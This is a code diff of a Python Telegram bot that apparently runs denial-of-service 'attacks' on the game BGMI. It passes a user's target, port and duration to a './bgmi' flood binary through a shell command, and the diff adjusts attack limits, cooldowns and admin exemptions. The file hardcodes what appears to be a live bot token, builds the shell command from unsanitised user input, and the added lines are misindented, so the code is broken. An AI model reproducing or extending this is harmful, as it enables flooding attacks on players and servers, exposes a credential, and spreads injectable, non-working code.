@@ -22,10 +22,10 @@ TIMEOUT = 130
 
 # Bot initialization (replace 'YOUR_BOT_TOKEN' with your actual bot token)
 bot = TeleBot('7057221824:AAEHiqVq3qC3U3yWByLufnvT-xMzgCdJyiE')
-
-## Constants for attack limits
+# Constants for attack limits
 MAX_ATTACKS_PER_DAY = 5
-COOLDOWN_TIME = 0  # Cooldown time between attacks in seconds
+
+COOLDOWN_TIME = 50  # Cooldown time between attacks in seconds
 
 # Function to read keys and their expiration dates from the file
 def read_keys():
@@ -242,12 +242,9 @@ def handle_bgmi(message):
         bot.reply_to(message, response)
         return
 
-    if not can_attack(user_id):
+    if not is_admin and not can_attack(user_id):
         bot.reply_to(message, "You have reached the maximum number of attacks for today.")
         return
-
-    bgmi_cooldown[user_id] = datetime.datetime.now()
-    track_attack(user_id)
     
     command = message.text.split()
     if len(command) == 4:
@@ -262,7 +259,10 @@ def handle_bgmi(message):
             start_attack_reply(message, target, port, duration)
             full_command = f"./bgmi {target} {port} {duration} 2000"
             subprocess.run(full_command, shell=True)
+                bgmi_cooldown[user_id] = datetime.datetime.now()
+    track_attack(user_id)
             response = f"BGMI attack finished. Target: {target} Port: {port} Time: {duration}"
+            
     else:
         response = "Usage: /bgmi <target> <port> <time>"
     
